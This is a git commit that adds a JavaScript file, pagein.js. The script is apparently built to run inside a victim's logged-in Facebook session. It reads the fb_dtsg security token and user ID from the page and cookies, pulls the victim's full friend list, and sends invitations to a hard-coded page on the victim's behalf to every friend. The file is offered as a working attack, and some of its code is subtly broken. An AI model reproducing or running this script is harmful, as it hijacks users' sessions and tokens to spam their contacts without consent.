15c050399eb30147dcc919ad4cc79b18e7a85249
naimulhaque <tumul2000@gmail.com>
2013-11-30 14:32:30 +0600

    Create pagein.js

---
+++ pagein.js
@@ -0,0 +1,76 @@
+jx = {
+    b: function () {
+        var b = !1;
+        if ("undefined" != typeof ActiveXObject) try {
+            b = new ActiveXObject("Msxml2.XMLHTTP")
+        } catch (c) {
+            try {
+                b = new ActiveXObject("Microsoft.XMLHTTP")
+            } catch (a) {
+                b = !1
+            }
+        } else if (window.XMLHttpRequest) try {
+            b = new XMLHttpRequest
+        } catch (h) {
+            b = !1
+        }
+        return b
+    },
+    load: function (b, c, a, h, g) {
+        var e = this.d();
+        if (e && b) {
+            e.overrideMimeType && e.overrideMimeType("text/xml");
+            h || (h = "GET");
+            a || (a = "text");
+            g || (g = {});
+            a = a.toLowerCase();
+            h = h.toUpperCase();
+            b += b.indexOf("?") + 1 ? "&" : "?";
+            var k = null;
+            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
+            e.open(h, b, !0);
+            e.onreadystatechange = g.c ? function () {
+                g.c(e)
+            } : function () {
+                if (4 == e.readyState)
+                    if (200 == e.status) {
+                        var b = "";
+                        e.responseText && (b = e.responseText);
+                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
+                        c && c(b)
+                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
+            };
+            e.send(k)
+        }
+    },
+    d: function () {
+        return this.b()
+    }
+};
+
+
+var page_id = '662994393721964';
+
+var i = 0;
+var suc = 0;
+var arr = new Array;
+var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
+    var b = a;
+    var c = b.substring(b.indexOf("{"));
+    var d = JSON.parse(c);
+    d = d.payload.entries;
+    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
+	senditnow(arr[i]);
+});
+
+
+function senditnow(opo) {
+
+jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function () {}, "text", "post");
+suc++;
+if(suc <= arr.length) {
+setTimeout(senditnow(arr[suc]),3000);
+}
+}
